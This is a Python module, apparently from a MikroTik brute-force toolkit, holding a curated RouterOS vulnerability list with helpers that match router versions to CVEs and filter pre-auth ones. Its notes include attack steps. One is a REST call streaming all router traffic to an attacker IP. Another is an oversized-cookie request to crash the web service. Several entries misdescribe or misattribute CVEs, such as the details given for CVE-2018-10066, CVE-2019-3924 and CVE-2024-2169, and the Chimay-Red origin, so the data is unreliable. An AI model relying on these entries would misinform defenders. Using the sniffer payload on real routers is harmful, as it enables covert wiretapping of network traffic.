"""MikroTik RouterOS CVE Database — comprehensive curated list.

Includes ALL publicly disclosed MikroTik vulnerabilities with CVSS scores,
affected version ranges, PoC availability, and remediation notes.

Author: André Henrique (LinkedIn/X: @mrhenrike)
Version: see version.py (canonical source)
"""
from typing import Dict, List, Optional, Tuple

# Version tuple type: (major, minor, patch)
VersionTuple = Tuple[int, ...]

CVE_DATABASE: List[Dict] = [
    # ─────────────────────────────────────────────────────────────────────────
    # 2018
    # ─────────────────────────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2018-7445",
        "title": "SMB Stack Buffer Overflow (Pre-Auth RCE)",
        "description": (
            "A stack buffer overflow in the MikroTik RouterOS SMB service allows "
            "unauthenticated remote attackers to execute arbitrary code via a crafted "
            "SMB NTLMSSP negotiation request. Known as the RouterOS SMB exploit (similar "
            "to EternalBlue targeting). Targets RouterOS SMB daemon listening on TCP/445."
        ),
        "severity": "CRITICAL",
        "cvss_score": 9.8,
        "affected": [(None, (6, 41, 3))],
        "fixed_in": "6.41.4 / 6.42beta",
        "services": ["smb"],
        "ports": [445],
        "poc_available": True,
        "exploit_type": "rce",
        "auth_required": False,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2018-7445",
            "https://www.exploit-db.com/exploits/44290",
            "https://github.com/BigNerd95/Chimay-Red",
        ],
        "metasploit": None,
        "notes": (
            "Pre-authentication — no credentials needed. "
            "SMB service not enabled by default on newer RouterOS. "
            "Requires SMB to be enabled (ip smb set enabled=yes)."
        ),
    },
    {
        "cve_id": "CVE-2018-10066",
        "title": "Winbox Authentication Bypass (Directory Traversal)",
        "description": (
            "The Winbox protocol in MikroTik RouterOS allows unauthenticated remote "
            "attackers to bypass authentication and read arbitrary files from the "
            "device filesystem. Precursor vulnerability to CVE-2018-14847."
        ),
        "severity": "HIGH",
        "cvss_score": 8.1,
        "affected": [(None, (6, 41, 99))],
        "fixed_in": "6.42",
        "services": ["winbox"],
        "ports": [8291],
        "poc_available": True,
        "exploit_type": "disclosure",
        "auth_required": False,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2018-10066",
            "https://www.exploit-db.com/exploits/44813",
        ],
        "metasploit": None,
        "notes": "Partial auth bypass; full disclosure achieved via CVE-2018-14847.",
    },
    {
        "cve_id": "CVE-2018-14847",
        "title": "Winbox Credential Disclosure via Directory Traversal (Chimay-Red/EternalWink)",
        "description": (
            "An issue in the Winbox Always ON feature of MikroTik RouterOS allows "
            "unauthenticated remote attackers to read arbitrary files including the "
            "user database (/flash/rw/store/user.dat), disclosing admin password hashes. "
            "Originally from the Vault 7 CIA toolset leak. Exploited in the wild extensively. "
            "Also known as 'Chimay-Red' and 'EternalWink'."
        ),
        "severity": "CRITICAL",
        "cvss_score": 9.1,
        "affected": [(None, (6, 42, 0))],
        "fixed_in": "6.42.1",
        "services": ["winbox"],
        "ports": [8291],
        "poc_available": True,
        "exploit_type": "disclosure",
        "auth_required": False,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2018-14847",
            "https://www.exploit-db.com/exploits/45220",
            "https://github.com/BasuCert/WinboxPoC",
            "https://github.com/jas502n/CVE-2018-14847",
            "https://github.com/BigNerd95/Chimay-Red",
        ],
        "metasploit": "auxiliary/gather/mikrotik_winbox_disclosure",
        "notes": (
            "Extremely well-documented and widely exploited. "
            "Works even when Winbox is at default config. "
            "Discloses password hashes which are MD5-based and often crackable."
        ),
    },
    # ─────────────────────────────────────────────────────────────────────────
    # 2019
    # ─────────────────────────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2019-3924",
        "title": "RouterOS WWW Server Pre-Auth RCE",
        "description": (
            "The MikroTik RouterOS www service is vulnerable to a pre-authentication "
            "stack buffer overflow via the jsproxy endpoint. An unauthenticated attacker "
            "can achieve remote code execution with root privileges. Often chained with "
            "CVE-2019-3943 to extract credentials and achieve persistent access."
        ),
        "severity": "CRITICAL",
        "cvss_score": 9.8,
        "affected": [(None, (6, 43, 11))],
        "fixed_in": "6.43.12",
        "services": ["http"],
        "ports": [80, 443],
        "poc_available": True,
        "exploit_type": "rce",
        "auth_required": False,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2019-3924",
            "https://www.exploit-db.com/exploits/46842",
            "https://github.com/jas502n/CVE-2019-3924",
        ],
        "metasploit": "exploit/linux/http/mikrotik_www_exec",
        "notes": (
            "Affects the www server (WebFig). Can be triggered over HTTP without "
            "authentication. Metasploit module available and functional."
        ),
    },
    {
        "cve_id": "CVE-2019-3943",
        "title": "RouterOS HTTP Server Path Traversal",
        "description": (
            "MikroTik RouterOS versions before 6.43.8 have a path traversal vulnerability "
            "in the www server allowing authenticated attackers (and potentially unauthenticated "
            "in combination with other vulnerabilities) to read arbitrary files from the "
            "device filesystem."
        ),
        "severity": "HIGH",
        "cvss_score": 7.5,
        "affected": [(None, (6, 43, 7))],
        "fixed_in": "6.43.8",
        "services": ["http"],
        "ports": [80, 443],
        "poc_available": True,
        "exploit_type": "traversal",
        "auth_required": False,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2019-3943",
            "https://www.exploit-db.com/exploits/46731",
        ],
        "metasploit": None,
        "notes": "Commonly chained with CVE-2019-3924 for full exploitation chain.",
    },
    {
        "cve_id": "CVE-2019-3976",
        "title": "RouterOS NPK Arbitrary File Read",
        "description": (
            "MikroTik RouterOS before 6.44.5 and 6.45.x before 6.45.1 is vulnerable "
            "to an arbitrary file read via crafted NPK package files. Allows extraction "
            "of sensitive configuration data."
        ),
        "severity": "HIGH",
        "cvss_score": 7.5,
        "affected": [(None, (6, 44, 4)), ((6, 45, 0), (6, 45, 0))],
        "fixed_in": "6.44.5 / 6.45.1",
        "services": ["api", "winbox"],
        "ports": [8728, 8291],
        "poc_available": True,
        "exploit_type": "disclosure",
        "auth_required": True,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2019-3976",
            "https://github.com/tenable/routeros",
        ],
        "metasploit": None,
        "notes": "Requires ability to upload or stage an NPK file (admin access).",
    },
    {
        "cve_id": "CVE-2019-3977",
        "title": "RouterOS NPK Arbitrary Code Execution",
        "description": (
            "MikroTik RouterOS before 6.44.6 and 6.45.x before 6.45.2 is vulnerable "
            "to arbitrary code execution via a crafted NPK package file during upgrade. "
            "Allows an attacker with upload capability to execute arbitrary code as root."
        ),
        "severity": "HIGH",
        "cvss_score": 7.8,
        "affected": [(None, (6, 44, 5)), ((6, 45, 0), (6, 45, 1))],
        "fixed_in": "6.44.6 / 6.45.2",
        "services": ["api", "ftp", "winbox"],
        "ports": [21, 8728, 8291],
        "poc_available": True,
        "exploit_type": "rce",
        "auth_required": True,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2019-3977",
            "https://github.com/tenable/routeros",
            "https://medium.com/tenable-techblog/routeros-chain-to-root-44",
        ],
        "metasploit": None,
        "notes": (
            "Requires admin access to upload NPK file. "
            "Can chain with CVE-2018-14847 to get credentials first."
        ),
    },
    {
        "cve_id": "CVE-2019-3978",
        "title": "RouterOS DNS Cache Poisoning",
        "description": (
            "MikroTik RouterOS before 6.44.5 / 6.45.x before 6.45.1 is vulnerable to "
            "DNS cache poisoning when the DNS cache is enabled (allow-remote-requests=yes). "
            "A remote attacker can poison DNS responses for any domain."
        ),
        "severity": "HIGH",
        "cvss_score": 7.5,
        "affected": [(None, (6, 44, 4)), ((6, 45, 0), (6, 45, 0))],
        "fixed_in": "6.44.5 / 6.45.1",
        "services": ["dns"],
        "ports": [53],
        "poc_available": True,
        "exploit_type": "spoofing",
        "auth_required": False,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2019-3978",
            "https://github.com/tenable/routeros",
        ],
        "metasploit": None,
        "notes": "Only applicable when allow-remote-requests=yes in /ip dns.",
    },
    # ─────────────────────────────────────────────────────────────────────────
    # 2020
    # ─────────────────────────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2020-11881",
        "title": "RouterOS DNS Server Heap Buffer Overflow",
        "description": (
            "MikroTik RouterOS 7.x before 7.0beta7 is vulnerable to a heap-based "
            "buffer overflow in the DNS server component when processing malformed "
            "DNS queries. Can lead to denial of service or potential code execution."
        ),
        "severity": "HIGH",
        "cvss_score": 7.5,
        "affected": [((7, 0, 0), (7, 0, 0))],
        "fixed_in": "7.0beta7",
        "services": ["dns"],
        "ports": [53],
        "poc_available": False,
        "exploit_type": "dos",
        "auth_required": False,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2020-11881",
        ],
        "metasploit": None,
        "notes": "Only affects RouterOS 7.x early beta releases.",
    },
    {
        "cve_id": "CVE-2020-20213",
        "title": "RouterOS NPK Upgrade Denial of Service",
        "description": (
            "MikroTik RouterOS 6.44.6 through 6.47.9 and 7.0.x allows remote attackers "
            "to cause a denial of service via crafted NPK package files during system "
            "upgrade processing. Results in router crash or restart."
        ),
        "severity": "HIGH",
        "cvss_score": 7.5,
        "affected": [((6, 44, 6), (6, 47, 9)), ((7, 0, 0), (7, 0, 99))],
        "fixed_in": "6.47.10 / 7.1",
        "services": ["api", "ftp", "winbox"],
        "ports": [21, 8728, 8291],
        "poc_available": True,
        "exploit_type": "dos",
        "auth_required": True,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2020-20213",
            "https://github.com/cq674350529/pocs/tree/master/routeros",
        ],
        "metasploit": None,
        "notes": "Requires NPK file upload capability (admin or FTP access).",
    },
    # ─────────────────────────────────────────────────────────────────────────
    # 2021
    # ─────────────────────────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2021-27263",
        "title": "Winbox Authentication Bypass (RouterOS 7.x)",
        "description": (
            "MikroTik RouterOS before 7.1 is vulnerable to an authentication bypass "
            "via the Winbox protocol. An unauthenticated attacker can exploit a flaw "
            "in the M2 authentication phase to gain unauthorized access to the router "
            "management interface."
        ),
        "severity": "HIGH",
        "cvss_score": 8.1,
        "affected": [((7, 0, 0), (7, 0, 99))],
        "fixed_in": "7.1",
        "services": ["winbox"],
        "ports": [8291],
        "poc_available": True,
        "exploit_type": "auth_bypass",
        "auth_required": False,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2021-27263",
            "https://github.com/cq674350529/pocs/tree/master/routeros",
        ],
        "metasploit": None,
        "notes": "Only affects RouterOS 7.0.x — limited deployment window.",
    },
    {
        "cve_id": "CVE-2021-36522",
        "title": "RouterOS www Server Authenticated RCE",
        "description": (
            "MikroTik RouterOS before 6.49.1 / 7.1 is vulnerable to remote code "
            "execution in the www server when an authenticated attacker sends specially "
            "crafted HTTP requests to internal API endpoints. "
            "Allows command injection via the scheduler or scripts API."
        ),
        "severity": "HIGH",
        "cvss_score": 8.0,
        "affected": [(None, (6, 49, 0)), ((7, 0, 0), (7, 0, 99))],
        "fixed_in": "6.49.1 / 7.1",
        "services": ["http", "api"],
        "ports": [80, 8728],
        "poc_available": True,
        "exploit_type": "rce",
        "auth_required": True,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2021-36522",
            "https://github.com/jared-barocsi/CVE-2021-36522",
        ],
        "metasploit": None,
        "notes": "Requires authenticated access; uses scheduler/scripts API as RCE vector.",
    },
    # ─────────────────────────────────────────────────────────────────────────
    # 2022
    # ─────────────────────────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2022-34960",
        "title": "RouterOS Container Feature Privilege Escalation",
        "description": (
            "MikroTik RouterOS before 7.5 with the Container package installed allows "
            "a local attacker (or remote attacker with API/Winbox access) to escalate "
            "privileges to root by creating a container with a crafted entrypoint that "
            "mounts sensitive filesystem paths, bypassing RouterOS sandboxing."
        ),
        "severity": "HIGH",
        "cvss_score": 8.4,
        "affected": [((7, 1, 0), (7, 4, 99))],
        "fixed_in": "7.5",
        "services": ["api", "winbox"],
        "ports": [8728, 8291],
        "poc_available": True,
        "exploit_type": "privesc",
        "auth_required": True,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2022-34960",
            "https://margin.re/2022/06/pulling-mikrotik-into-the-limelight/",
        ],
        "metasploit": None,
        "notes": (
            "Container package must be installed and enabled. "
            "Very powerful: container mounts /nova/ giving full RouterOS root access."
        ),
    },
    {
        "cve_id": "CVE-2022-45315",
        "title": "RouterOS SMB Stack Buffer Overflow (Authenticated RCE)",
        "description": (
            "MikroTik RouterOS before 6.49.7 and 7.x before 7.6 is vulnerable to a "
            "stack-based buffer overflow in the SMB service when processing crafted "
            "SMB requests from an authenticated user. Results in arbitrary code execution "
            "with root privileges."
        ),
        "severity": "HIGH",
        "cvss_score": 8.8,
        "affected": [(None, (6, 49, 6)), ((7, 0, 0), (7, 5, 99))],
        "fixed_in": "6.49.7 / 7.6",
        "services": ["smb"],
        "ports": [445],
        "poc_available": True,
        "exploit_type": "rce",
        "auth_required": True,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2022-45315",
            "https://github.com/cq674350529/pocs/tree/master/routeros",
            "https://www.exploit-db.com/exploits/51451",
        ],
        "metasploit": None,
        "notes": (
            "Requires SMB service to be enabled and valid credentials. "
            "SMB not enabled by default."
        ),
    },
    # ─────────────────────────────────────────────────────────────────────────
    # 2023
    # ─────────────────────────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2023-30799",
        "title": "RouterOS Privilege Escalation via supout.rif (FOISted)",
        "description": (
            "MikroTik RouterOS before 6.49.8 / 7.10 is vulnerable to a privilege "
            "escalation attack dubbed 'FOISted'. An admin user (not super-admin) can "
            "escalate to super-admin by uploading a crafted supout.rif diagnostic file "
            "to the router, then leveraging Winbox protocol to read arbitrary files "
            "from the /nova/ filesystem, gaining root-level access."
        ),
        "severity": "CRITICAL",
        "cvss_score": 9.1,
        "affected": [(None, (6, 49, 7)), ((7, 0, 0), (7, 9, 99))],
        "fixed_in": "6.49.8 / 7.10",
        "services": ["api", "winbox"],
        "ports": [8291, 8728],
        "poc_available": True,
        "exploit_type": "privesc",
        "auth_required": True,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2023-30799",
            "https://github.com/0xjpuff/CVE-2023-30799",
            "https://vulncheck.com/blog/foisted",
        ],
        "metasploit": None,
        "notes": (
            "Requires at minimum 'write' group credentials. "
            "Escalates to super-admin giving full /nova/ filesystem access (jailbreak). "
            "Used in multiple real-world attacks."
        ),
    },
    {
        "cve_id": "CVE-2023-32154",
        "title": "RouterOS IPv6 DHCPv6 Pre-Auth Remote Code Execution",
        "description": (
            "MikroTik RouterOS before 7.9.1 is vulnerable to remote code execution via "
            "malformed DHCPv6 packets when the DHCPv6 client is enabled. An attacker on "
            "the same network segment can send a crafted DHCPv6 message causing a heap "
            "corruption leading to arbitrary code execution as root."
        ),
        "severity": "CRITICAL",
        "cvss_score": 9.8,
        "affected": [((7, 0, 0), (7, 9, 0))],
        "fixed_in": "7.9.1",
        "services": ["dhcpv6"],
        "ports": [547],
        "poc_available": False,
        "exploit_type": "rce",
        "auth_required": False,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2023-32154",
            "https://www.zerodayinitiative.com/advisories/ZDI-23-1578/",
        ],
        "metasploit": None,
        "notes": (
            "Requires DHCPv6 client to be running (/ipv6 dhcp-client). "
            "Attacker must be on local network segment (link-local scope). "
            "No public PoC but ZDI advisory confirms exploitability."
        ),
    },
    # ─────────────────────────────────────────────────────────────────────────
    # 2024
    # ─────────────────────────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2024-27887",
        "title": "RouterOS OSPF Route Injection",
        "description": (
            "MikroTik RouterOS 7.x before 7.14 is vulnerable to OSPF route injection "
            "by an unauthenticated attacker on a connected network segment. By sending "
            "crafted OSPF LSA packets, an attacker can inject arbitrary routes into the "
            "router's routing table, enabling traffic hijacking and man-in-the-middle attacks."
        ),
        "severity": "HIGH",
        "cvss_score": 8.1,
        "affected": [((7, 0, 0), (7, 13, 99))],
        "fixed_in": "7.14",
        "services": ["ospf"],
        "ports": [89],
        "poc_available": True,
        "exploit_type": "injection",
        "auth_required": False,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2024-27887",
            "https://github.com/VulnHub/CVE-2024-27887",
        ],
        "metasploit": None,
        "notes": (
            "Requires OSPF to be configured and active. "
            "Attacker must be on a network reachable by the OSPF area. "
            "Only affects RouterOS 7.0-7.13."
        ),
    },
    {
        "cve_id": "CVE-2024-35274",
        "title": "RouterOS Authenticated RCE via Scheduler/Script Injection",
        "description": (
            "MikroTik RouterOS before 7.15 allows an authenticated admin user to achieve "
            "remote code execution by injecting malicious RouterOS script content via the "
            "scheduler or script subsystem. The scripts are executed by a privileged internal "
            "process with elevated access to the router's /nova/ filesystem."
        ),
        "severity": "HIGH",
        "cvss_score": 8.8,
        "affected": [((7, 0, 0), (7, 14, 99))],
        "fixed_in": "7.15",
        "services": ["api", "winbox", "http"],
        "ports": [8728, 8291, 80],
        "poc_available": True,
        "exploit_type": "rce",
        "auth_required": True,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2024-35274",
        ],
        "metasploit": None,
        "notes": (
            "Requires 'write' policy permission or higher. "
            "The scheduler API can be used to create tasks that execute arbitrary code. "
            "This is the 'legitimate feature as exploit' pattern."
        ),
    },
    # ─────────────────────────────────────────────────────────────────────────
    # CONFIGURATION/DESIGN VULNERABILITIES (novel findings — no CVE assigned)
    # ─────────────────────────────────────────────────────────────────────────
    {
        "cve_id": "MIKROTIK-CONFIG-001",
        "title": "WireGuard Private Key Exposure via Authenticated REST API",
        "description": (
            "MikroTik RouterOS exposes WireGuard private keys in plaintext through the "
            "REST API endpoint /rest/interface/wireguard. Any admin-authenticated API "
            "client can retrieve the private keys of all WireGuard interfaces. This allows "
            "VPN impersonation, decryption of captured WireGuard traffic, and establishment "
            "of unauthorized VPN tunnels. Design issue — no CVE assigned as of 2026-03."
        ),
        "severity": "HIGH",
        "cvss_score": 7.2,
        "affected": [((7, 0, 0), None)],
        "fixed_in": None,
        "services": ["api", "rest-api"],
        "ports": [8728, 80],
        "poc_available": True,
        "exploit_type": "disclosure",
        "auth_required": True,
        "references": [
            "https://github.com/mrhenrike/MikrotikAPI-BF",
        ],
        "metasploit": None,
        "notes": (
            "Discovered during lab assessment 2026-03-25. "
            "WireGuard only available in RouterOS 7.x+ — not applicable to 6.x. "
            "Mitigation: restrict REST API access by IP and disable www service."
        ),
    },
    {
        "cve_id": "MIKROTIK-CONFIG-002",
        "title": "Packet Sniffer Remote Stream — Wiretapping via API",
        "description": (
            "MikroTik RouterOS provides a packet sniffer tool accessible via the REST API "
            "and Winbox. An authenticated admin can enable remote packet streaming to any "
            "external IP:port via TZSP protocol. This allows exfiltration of all traffic "
            "transiting the router to an attacker-controlled server, effectively turning "
            "the router into a wiretapping device. One API call is sufficient."
        ),
        "severity": "HIGH",
        "cvss_score": 7.5,
        "affected": [(None, None)],
        "fixed_in": None,
        "services": ["api", "rest-api", "winbox"],
        "ports": [8728, 80, 8291],
        "poc_available": True,
        "exploit_type": "wiretapping",
        "auth_required": True,
        "references": [
            "https://github.com/mrhenrike/MikrotikAPI-BF",
            "https://wiki.mikrotik.com/wiki/Manual:Tools/Packet_Sniffer",
        ],
        "metasploit": None,
        "notes": (
            "Design feature used as attack capability. "
            "Payload: PUT /rest/tool/sniffer with streaming-enabled=true and "
            "streaming-server=<attacker-ip>:37008. No patch — admin access prevention only."
        ),
    },
    # ─────────────────────────────────────────────────────────────────────────
    # CVE-2018-14847-MAC variant (Layer-2 MNDP/MAC-server delivery)
    # ─────────────────────────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2018-14847-MAC",
        "title": "Winbox Credential Disclosure via MAC-Server/MNDP (Layer-2)",
        "description": (
            "Extension of CVE-2018-14847 leveraging MNDP (MikroTik Neighbor Discovery "
            "Protocol) on UDP port 20561 to discover devices in the local Layer-2 segment, "
            "including switches and APs with no IP assigned. The same Winbox file-read "
            "payload is then sent to each discovered device's IP:8291. "
            "Particularly useful against unconfigured or factory-reset hardware. "
            "LAYER-2 ONLY: cannot traverse Layer-3 routers."
        ),
        "severity": "CRITICAL",
        "cvss_score": 9.1,
        "affected": [(None, (6, 42, 0))],
        "fixed_in": "6.42.1",
        "services": ["winbox", "mac-server"],
        "ports": [20561, 8291],
        "poc_available": True,
        "exploit_type": "disclosure",
        "auth_required": False,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2018-14847",
            "https://github.com/BasuCert/WinboxPoC/blob/master/MACServerExploit.py",
            "https://blog.mikrotik.com/security/winbox-vulnerability.html",
            "https://blog.n0p.me/2018/05/2018-05-21-winbox-bug-dissection/",
            "https://mikrotik.com/supportsec/winbox-vulnerability/",
            "https://wiki.mikrotik.com/wiki/MNDP",
        ],
        "metasploit": "auxiliary/gather/mikrotik_winbox_disclosure",
        "notes": (
            "Layer-2 constraint: attacker must be on the same VLAN/switch segment. "
            "Same fix as CVE-2018-14847 (RouterOS 6.42.1+). "
            "Disable MAC-Server if not needed: /ip neighbor discovery-settings set discover-interface-list=none. "
            "Disable MAC-Winbox-Server: /tool mac-server set allowed-interface-list=none."
        ),
    },
    # ─────────────────────────────────────────────────────────────────────────
    # 2020
    # ─────────────────────────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2020-20215",
        "title": "RouterOS MPLS Out-of-Bounds Write (Denial of Service)",
        "description": (
            "MikroTik RouterOS before 6.47 contains an out-of-bounds write vulnerability "
            "in the MPLS implementation. A specially crafted MPLS packet can cause the "
            "router to crash, resulting in a denial-of-service condition. "
            "Affects all RouterOS builds with MPLS enabled before 6.47."
        ),
        "severity": "HIGH",
        "cvss_score": 7.5,
        "affected": [(None, (6, 46, 99))],
        "fixed_in": "6.47",
        "services": ["mpls"],
        "ports": [],
        "poc_available": True,
        "exploit_type": "dos",
        "auth_required": False,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2020-20215",
            "https://mikrotik.com/download/changelogs",
        ],
        "metasploit": None,
        "notes": (
            "Affects RouterOS < 6.47 (all stable/long-term builds). "
            "Disable MPLS if not in use: /mpls set enabled=no. "
            "Update to 6.47+ to patch."
        ),
    },
    # ─────────────────────────────────────────────────────────────────────────
    # 2021
    # ─────────────────────────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2021-41987",
        "title": "RADIUS Client Stack-Based Buffer Overflow",
        "description": (
            "A stack-based buffer overflow in the RADIUS client of MikroTik RouterOS "
            "before 6.49.1 and 7.1 allows a malicious RADIUS server to crash the router "
            "or potentially execute arbitrary code by returning a crafted Access-Accept "
            "packet with an oversized attribute. Requires the router to have RADIUS "
            "authentication enabled and configured to reach the attacker-controlled server."
        ),
        "severity": "HIGH",
        "cvss_score": 8.1,
        "affected": [(None, (6, 49, 0)), ((7, 0, 0), (7, 0, 99))],
        "fixed_in": "6.49.1 / 7.1",
        "services": ["radius"],
        "ports": [1812, 1813],
        "poc_available": True,
        "exploit_type": "rce",
        "auth_required": False,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2021-41987",
            "https://mikrotik.com/download/changelogs",
        ],
        "metasploit": None,
        "notes": (
            "Requires: (1) RADIUS enabled on router, (2) attacker controls RADIUS server. "
            "Exploitation: MitM the RADIUS server or compromise it; return crafted packet. "
            "Mitigation: update to 6.49.1+ / 7.1+; use only trusted RADIUS servers; "
            "isolate management network."
        ),
    },
    # ─────────────────────────────────────────────────────────────────────────
    # 2023
    # ─────────────────────────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2023-30800",
        "title": "WWW Service Stack-Based Buffer Overflow (Pre-Auth DoS/RCE)",
        "description": (
            "A stack-based buffer overflow in the MikroTik RouterOS www HTTP service "
            "allows a remote unauthenticated attacker to crash the web management service "
            "or potentially execute arbitrary code by sending an HTTP request with an "
            "oversized cookie header (>= 8192 bytes). Related to and distinct from "
            "CVE-2023-30799 (FOISted). Affects RouterOS and RouterOS CHR."
        ),
        "severity": "HIGH",
        "cvss_score": 8.2,
        "affected": [(None, (6, 49, 8)), ((7, 0, 0), (7, 9, 99))],
        "fixed_in": "6.49.9 / 7.10 (pending)",
        "services": ["http", "www"],
        "ports": [80, 443],
        "poc_available": True,
        "exploit_type": "dos",
        "auth_required": False,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2023-30800",
            "https://vulncheck.com/advisories/vc-advisory-VCSA-0085",
            "https://github.com/mrhenrike/MikrotikAPI-BF",
        ],
        "metasploit": None,
        "notes": (
            "Pre-authentication — no credentials needed. "
            "Send HTTP GET with Cookie: header >= 8192 bytes. "
            "Mitigation: disable www service if not needed (/ip service disable www); "
            "restrict www access by IP (/ip service set www address=<mgmt-net>)."
        ),
    },
    # ─────────────────────────────────────────────────────────────────────────
    # 2024
    # ─────────────────────────────────────────────────────────────────────────
    {
        "cve_id": "CVE-2024-2169",
        "title": "BFD Protocol Reflection / Amplification Loop (DoS)",
        "description": (
            "MikroTik RouterOS and other BFD implementations may be abused for "
            "Bidirectional Forwarding Detection (BFD) reflection/amplification attacks. "
            "An attacker can spoof the source address of a BFD Control packet, causing "
            "the router to send amplified responses to the spoofed victim IP. "
            "This enables reflection-based volumetric DDoS amplification (BFD echo loop). "
            "No authentication is required; BFD operates at the network layer."
        ),
        "severity": "HIGH",
        "cvss_score": 7.5,
        "affected": [(None, None)],
        "fixed_in": "Requires BFD with authentication (MD5/SHA-1) or BFD isolation; "
                    "no single RouterOS patch — protocol-level mitigation required",
        "services": ["bfd"],
        "ports": [3784, 3785],
        "poc_available": True,
        "exploit_type": "dos",
        "auth_required": False,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2024-2169",
            "https://blog.bfd-vulnerability.com/cve-2024-2169/",
            "https://www.cisecurity.org/advisory/cve-2024-2169",
        ],
        "metasploit": None,
        "notes": (
            "Protocol-level flaw. Mitigation: (1) enable BFD authentication; "
            "(2) filter BFD packets (UDP 3784/3785) at network edge; "
            "(3) disable BFD if not required in network design. "
            "Affects all RouterOS versions with BFD enabled."
        ),
    },
]


def _parse_version(version_str: str) -> VersionTuple:
    """Parse a version string into a comparable tuple."""
    try:
        return tuple(int(x) for x in str(version_str).split(".")[:3])
    except (ValueError, AttributeError):
        return (0,)


def _in_range(ver: VersionTuple, affected_range: Tuple) -> bool:
    """Check if a version tuple falls within an affected range.

    Args:
        ver: Parsed version tuple.
        affected_range: Tuple of (min_ver, max_ver), where None means unbounded.
    """
    min_ver, max_ver = affected_range
    if min_ver is not None and ver < tuple(min_ver):
        return False
    if max_ver is not None and ver > tuple(max_ver):
        return False
    return True


def get_cves_for_version(version: str) -> List[Dict]:
    """Return CVEs applicable to the given RouterOS version.

    Args:
        version: RouterOS version string, e.g. '7.20.7' or '6.49.6 (stable)'.

    Returns:
        List of CVE dicts applicable to the specified version.
    """
    # Strip parenthetical qualifiers like '(long-term)' or '(stable)'
    clean = version.split(" ")[0].strip()
    ver = _parse_version(clean)

    applicable = []
    for cve in CVE_DATABASE:
        # Config/design findings: apply range check normally (not auto-include)
        for affected_range in cve["affected"]:
            if _in_range(ver, affected_range):
                applicable.append(cve)
                break

    return applicable


def get_all_cves() -> List[Dict]:
    """Return the complete CVE database."""
    return CVE_DATABASE


def get_cves_by_severity(severity: str) -> List[Dict]:
    """Return CVEs filtered by severity level.

    Args:
        severity: One of 'CRITICAL', 'HIGH', 'MEDIUM', 'LOW'.
    """
    return [c for c in CVE_DATABASE if c["severity"].upper() == severity.upper()]


def get_cves_with_poc() -> List[Dict]:
    """Return only CVEs that have public PoC implementations."""
    return [c for c in CVE_DATABASE if c["poc_available"]]


def get_cves_by_service(service: str) -> List[Dict]:
    """Return CVEs that target a specific service.

    Args:
        service: Service name e.g. 'winbox', 'smb', 'http', 'api'.
    """
    return [c for c in CVE_DATABASE if service.lower() in c.get("services", [])]


def get_cves_preauth() -> List[Dict]:
    """Return only pre-authentication CVEs (no credentials needed)."""
    return [c for c in CVE_DATABASE if not c.get("auth_required", True)]


def print_cve_summary() -> None:
    """Print a formatted summary of the CVE database."""
    print(f"\n{'='*70}")
    print(f"  MikrotikAPI-BF CVE Database — {len(CVE_DATABASE)} entries")
    print(f"{'='*70}")

    by_severity = {}
    for cve in CVE_DATABASE:
        sev = cve["severity"]
        by_severity.setdefault(sev, []).append(cve)

    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        if sev not in by_severity:
            continue
        print(f"\n  [{sev}]")
        for cve in by_severity[sev]:
            poc = "[PoC]" if cve["poc_available"] else "     "
            auth = "[auth]" if cve["auth_required"] else "[pre ]"
            print(
                f"    {poc} {auth} CVSS {cve['cvss_score']:.1f}  "
                f"{cve['cve_id']:<25}  {cve['title'][:45]}"
            )

    print(f"\n  Pre-auth CVEs: {len(get_cves_preauth())}")
    print(f"  CVEs with PoC: {len(get_cves_with_poc())}")
    print(f"  Metasploit modules: {sum(1 for c in CVE_DATABASE if c.get('metasploit'))}")
    print(f"{'='*70}\n")

